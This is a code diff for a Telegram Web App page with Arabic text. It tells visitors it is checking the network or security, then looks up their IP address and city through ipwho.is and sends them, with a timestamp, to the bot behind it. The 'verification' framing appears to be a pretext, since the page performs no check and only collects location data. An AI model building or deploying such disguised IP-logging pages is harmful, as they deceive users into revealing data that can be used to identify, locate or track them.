@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد البيانات</title>
+    <title>تأكيد النظام</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: var(--tg-theme-bg-color, #18222d);
             color: var(--tg-theme-text-color, #ffffff);
-            padding: 30px;
+            padding: 40px;
             text-align: center;
         }
         .card {
@@ -21,7 +21,7 @@
             text-align: right;
         }
         .btn {
-            background-color: #2bba53;
+            background-color: #2481cc;
             color: #ffffff;
             border: none;
             padding: 15px;
@@ -34,42 +34,46 @@
     </style>
 </head>
 <body>
-    <h2>🔐 التحقق من الأمان</h2>
+    <h2>🔐 جاري التحقق من الشبكة</h2>
     <div class="card" id="info">
-        <p>جارِ قراءة بيانات الاتصال...</p>
+        <p>جاري فحص الاتصال...</p>
     </div>
 
-    <button class="btn" onclick="sendNow()">إتمام وإرسال البيانات 🚀</button>
+    <button class="btn" id="sendBtn" onclick="sendData()" style="display:none;">إتمام وإرسال البيانات 🚀</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        let payload = {};
+        let userIp = "";
+        let userCity = "";
 
         fetch('https://ipwho.is/')
             .then(res => res.json())
             .then(data => {
                 if (data.success) {
-                    payload.ip = data.ip;
-                    payload.country = data.country;
-                    payload.city = data.city;
-                    payload.isp = data.connection.isp;
-                    
+                    userIp = data.ip;
+                    userCity = data.city;
                     document.getElementById('info').innerHTML = `
-                        <p><b>حالة الاتصال:</b> متصل ✅</p>
-                        <p><b>المدينة:</b> ${data.city}</p>
+                        <p><b>الحالة:</b> جاهز للإرسال ✅</p>
+                        <p><b>المدينة:</b> ${userCity}</p>
                     `;
+                    document.getElementById('sendBtn').style.display = "block";
                 }
             }).catch(() => {
-                document.getElementById('info').innerHTML = `<p>فشل جلب الشبكة</p>`;
+                document.getElementById('info').innerHTML = `<p>فشل الاتصال بالشبكة</p>`;
             });
 
-        function sendNow() {
-            // إرسال البيانات المجمعة وإغلاق التطبيق فوراً
+        function sendData() {
+            const payload = {
+                ip: userIp,
+                city: userCity,
+                time: new Date().toLocaleString()
+            };
+            
+            // استخدام الطريقة البديلة المضمونة للإرسال عبر تليغرام
             tg.sendData(JSON.stringify(payload));
-            tg.close();
         }
     </script>
 </body>
